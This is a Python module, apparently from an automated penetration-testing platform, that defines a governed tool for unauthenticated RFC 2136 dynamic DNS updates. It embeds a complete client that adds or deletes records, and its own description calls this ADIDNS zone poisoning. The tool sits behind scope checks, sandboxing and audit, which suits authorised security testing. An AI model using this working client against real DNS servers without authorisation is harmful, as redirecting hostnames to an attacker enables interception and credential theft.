"""Durable ``nexus.post.dns_update`` handler: governed dynamic DNS update (ADIDNS).

Why this tool exists (RUN_sala10 / RA2): the target's own DNS TXT record stated
that *insecure dynamic updates are accepted from untrusted sources*, and a manual
``nsupdate`` proved it (a record was created and deleted without credentials).
That vector — adding/removing a record so a host resolves to the operator — had
no governed primitive: it lived outside scope, approval and audit.

``nsupdate`` cannot be used here: the sandbox runs every process with
``stdin=DEVNULL``, and ``nsupdate`` only takes commands on stdin or a file. The
handler therefore embeds a minimal RFC 2136 client (stdlib ``socket``/``struct``)
and runs it through the sandbox like the rest of the durable tools. The
post-condition is the **server's answer**: ``NOERROR`` for one update means the
server *accepted* an unauthenticated change to the zone.
"""

from __future__ import annotations

import ipaddress
import json
from typing import Any

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.sandbox import sandbox_for_environment

from ._ad import validate_host
from ._exec import RECON_ALLOWED_PROGRAMS, run_in_sandbox
from .dns import DNS_DEFAULT_TIMEOUT_SECONDS, DNS_MAX_TIMEOUT_SECONDS, validate_dns_name
from .workspace import workspace_root

#: Record types this tool can add or delete (RFC 2136 update section).
DNS_UPDATE_TYPES = ("A", "AAAA", "CNAME", "TXT")
DNS_UPDATE_ACTIONS = ("add", "delete")
DNS_UPDATE_DEFAULT_TTL = 60
DNS_UPDATE_MAX_TTL = 86400

#: ``python3`` is already in the recon allowlist; the client is stdlib-only.
DNS_UPDATE_SCRIPT = r"""
import ipaddress, json, random, socket, struct, sys

RCODES = {0: "NOERROR", 1: "FORMERR", 2: "SERVFAIL", 3: "NXDOMAIN", 4: "NOTIMP",
          5: "REFUSED", 6: "YXDOMAIN", 7: "YXRRSET", 8: "NXRRSET", 9: "NOTAUTH",
          10: "NOTZONE"}
TYPES = {"A": 1, "NS": 2, "CNAME": 5, "SOA": 6, "TXT": 16, "AAAA": 28}
CLASS_IN = 1
CLASS_ANY = 255
OPCODE_UPDATE = 5


def encode_name(name):
    out = b""
    for label in name.rstrip(".").split("."):
        if not label or len(label) > 63:
            raise ValueError("invalid DNS label: %r" % label)
        out += struct.pack("!B", len(label)) + label.encode("ascii")
    return out + b"\x00"


def rdata_for(rtype, value):
    if rtype == "A":
        return socket.inet_pton(socket.AF_INET, value)
    if rtype == "AAAA":
        return socket.inet_pton(socket.AF_INET6, value)
    if rtype == "CNAME":
        return encode_name(value)
    if rtype == "TXT":
        blob = value.encode("utf-8")
        if not blob or len(blob) > 255:
            raise ValueError("TXT value must be 1..255 bytes")
        return struct.pack("!B", len(blob)) + blob
    raise ValueError("unsupported record type for update: %s" % rtype)


def build_message(ident, zone, name, rtype, value, ttl, action):
    # RFC 2136: header (opcode UPDATE, ZOCOUNT=1, UPCOUNT=1), zone section with the
    # zone name typed SOA/IN, then one update RR (add = class IN + rdata,
    # delete = class ANY, ttl 0 and empty rdata to remove the whole RRset).
    header = struct.pack("!HHHHHH", ident, OPCODE_UPDATE << 11, 1, 0, 1, 0)
    zone_section = encode_name(zone) + struct.pack("!HH", TYPES["SOA"], CLASS_IN)
    if action == "add":
        rdata = rdata_for(rtype, value)
        update = (encode_name(name)
                  + struct.pack("!HHIH", TYPES[rtype], CLASS_IN, ttl, len(rdata)) + rdata)
    else:
        update = encode_name(name) + struct.pack("!HHIH", TYPES[rtype], CLASS_ANY, 0, 0)
    return header + zone_section + update


def main():
    server, port, zone, name, rtype, value, ttl, action, timeout = sys.argv[1:10]
    ttl = int(ttl)
    try:
        ident = random.randrange(0, 65536)
        message = build_message(ident, zone, name, rtype, value, ttl, action)
    except Exception as exc:
        print(json.dumps({"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}))
        return
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(float(timeout))
    try:
        sock.sendto(message, (server, int(port)))
        data, _peer = sock.recvfrom(4096)
    except OSError as exc:
        print(json.dumps({"ok": False, "error": "%s: %s" % (type(exc).__name__, exc),
                          "update_bytes": len(message)}))
        return
    finally:
        sock.close()
    id_matched = len(data) >= 12 and struct.unpack_from("!H", data, 0)[0] == ident
    rcode = (data[3] & 0x0F) if len(data) >= 4 else -1
    print(json.dumps({
        "ok": bool(id_matched and rcode == 0),
        "id_matched": id_matched,
        "rcode": rcode,
        "rcode_name": RCODES.get(rcode, "RCODE%d" % rcode),
        "action": action,
        "zone": zone,
        "name": name,
        "record_type": rtype,
        "value": value,
        "ttl": ttl,
        "update_bytes": len(message),
        "reply_bytes": len(data),
    }))


main()
"""


def validate_update_value(record_type: str, value: Any) -> str:
    """Return the record value, validated for its type (fail closed)."""
    text = str(value or "").strip()
    if not text:
        raise ValueError("value is required")
    if len(text) > 512:
        raise ValueError("value is too long")
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in text):
        raise ValueError("value contains control characters")
    if record_type in {"A", "AAAA"}:
        try:
            return str(ipaddress.ip_address(text))
        except ValueError as exc:
            raise ValueError(f"{record_type} value is not a valid address: {exc}") from None
    # CNAME/TXT carry the raw text; the embedded client rejects an over-long TXT.
    return text


def validate_update_name(name: str, zone: str) -> str:
    """Return the record owner name, refusing the zone apex (SOA/NS of the zone)."""
    owner = validate_dns_name(name)
    if owner.lower() == zone.lower():
        raise ValueError("refusing to touch the zone apex; use a record name inside it")
    if not owner.lower().endswith(zone.lower()):
        raise ValueError(f"record name {owner!r} is not inside zone {zone!r}")
    return owner


def dns_update_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.post.dns_update``."""
    return ToolDefinition(
        tool_id="nexus.post.dns_update",
        idempotent=False,
        name="Dynamic DNS update",
        tenant_id=tenant_id,
        description=(
            "Añade o borra UN registro (A/AAAA/CNAME/TXT) por actualización dinámica "
            "DNS (RFC 2136) contra un servidor dentro del scope, sin credenciales. "
            "Devuelve el RCODE: NOERROR significa que el servidor ACEPTÓ el cambio sin "
            "autenticar. Es el primitivo de ADIDNS/envenenamiento de zona (add/delete); "
            "rechaza el apex de la zona."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "target": {"type": "string", "minLength": 1, "maxLength": 255},
                "zone": {"type": "string", "minLength": 1, "maxLength": 253},
                "name": {"type": "string", "minLength": 1, "maxLength": 253},
                "record_type": {
                    "type": "string",
                    "enum": list(DNS_UPDATE_TYPES),
                    "default": "A",
                },
                "value": {"type": "string", "minLength": 1, "maxLength": 512},
                "action": {"type": "string", "enum": list(DNS_UPDATE_ACTIONS), "default": "add"},
                "ttl": {
                    "type": "integer",
                    "minimum": 0,
                    "maximum": DNS_UPDATE_MAX_TTL,
                    "default": DNS_UPDATE_DEFAULT_TTL,
                },
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 5,
                    "maximum": DNS_MAX_TIMEOUT_SECONDS,
                },
            },
            "required": ["target", "zone", "name", "value"],
            "additionalProperties": False,
        },
        risk=RiskLevel.MEDIUM,
        effect="exploit",
        required_permissions=["execute:tool:nexus.post.dns_update"],
        timeout_seconds=120,
        max_output_bytes=200_000,
        scope_target_field="target",
        scope_required=True,
        sandbox_required=True,
    )


def _validate_action(value: Any) -> str:
    action = str(value or "add").strip().lower()
    if action not in DNS_UPDATE_ACTIONS:
        raise ValueError(f"unsupported action: {action!r}")
    return action


def _validate_record_type(value: Any) -> str:
    record_type = str(value or "A").strip().upper()
    if record_type not in DNS_UPDATE_TYPES:
        raise ValueError(f"unsupported record type for update: {record_type!r}")
    return record_type


async def dns_update_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Send one dynamic DNS update and report the server's own answer."""
    target = validate_host(arguments.get("target"))
    zone = validate_dns_name(arguments.get("zone"))
    record_type = _validate_record_type(arguments.get("record_type"))
    action = _validate_action(arguments.get("action"))
    name = validate_update_name(str(arguments.get("name") or ""), zone)
    value = validate_update_value(record_type, arguments.get("value"))

    raw_ttl = arguments.get("ttl")
    ttl = min(DNS_UPDATE_MAX_TTL, max(0, int(raw_ttl) if raw_ttl not in (None, "") else DNS_UPDATE_DEFAULT_TTL))
    requested_timeout = arguments.get("timeout_seconds")
    timeout_seconds = min(
        DNS_MAX_TIMEOUT_SECONDS,
        max(5, int(requested_timeout) if requested_timeout else DNS_DEFAULT_TIMEOUT_SECONDS),
    )

    argv = [
        "python3",
        "-c",
        DNS_UPDATE_SCRIPT,
        target,
        "53",
        zone,
        name,
        record_type,
        value,
        str(ttl),
        action,
        str(timeout_seconds),
    ]
    evidence: dict[str, Any] = {
        "server": target,
        "zone": zone,
        "name": name,
        "record_type": record_type,
        "action": action,
        "value": value,
        "ttl": ttl,
        "noise_level": "medium",
        "unauthenticated": True,
    }
    sandbox = _update_sandbox(workspace_root())
    result = await run_in_sandbox(
        sandbox,
        argv,
        timeout_seconds=timeout_seconds,
        image_env="NEXUS_DNS_IMAGE",
        default_image="python:3.12-alpine",
    )

    payload = _parse_payload(result.stdout or "")
    payload.update({k: evidence[k] for k in ("server", "zone", "name", "record_type", "action", "value", "ttl")})
    evidence.update(
        {
            "rcode": payload.get("rcode"),
            "rcode_name": payload.get("rcode_name"),
            "id_matched": payload.get("id_matched"),
            "update_bytes": payload.get("update_bytes"),
            "error": payload.get("error"),
        }
    )

    if result.timed_out:
        return ToolResult(
            output=payload | {"error": "dns update timed out"},
            verified=False,
            verification_method="dns_update_timeout",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
            timed_out=True,
        )

    if payload.get("error"):
        return ToolResult(
            output=payload,
            verified=False,
            verification_method="dns_update_failed",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    accepted = bool(payload.get("ok"))
    if accepted:
        method = "dns_update_accepted"
    elif payload.get("id_matched"):
        # The server answered and refused: a legitimate negative, not a broken tool.
        method = "dns_update_refused"
    else:
        method = "dns_update_unanswered"
    return ToolResult(
        output=payload,
        verified=accepted,
        verification_method=method,
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
    )


def _update_sandbox(root: str):
    """Sandbox for the embedded client (only ``python3`` is required)."""
    return sandbox_for_environment(root, allowed_programs=RECON_ALLOWED_PROGRAMS)


def _parse_payload(stdout: str) -> dict[str, Any]:
    """Return the last JSON object printed by the embedded client."""
    for line in reversed((stdout or "").splitlines()):
        line = line.strip()
        if line.startswith("{"):
            try:
                value = json.loads(line)
            except json.JSONDecodeError:
                continue
            if isinstance(value, dict):
                return value
    return {"error": "dns update client produced no result"}


__all__ = [
    "DNS_UPDATE_ACTIONS",
    "DNS_UPDATE_SCRIPT",
    "DNS_UPDATE_TYPES",
    "dns_update_definition",
    "dns_update_handler",
    "validate_update_name",
    "validate_update_value",
]
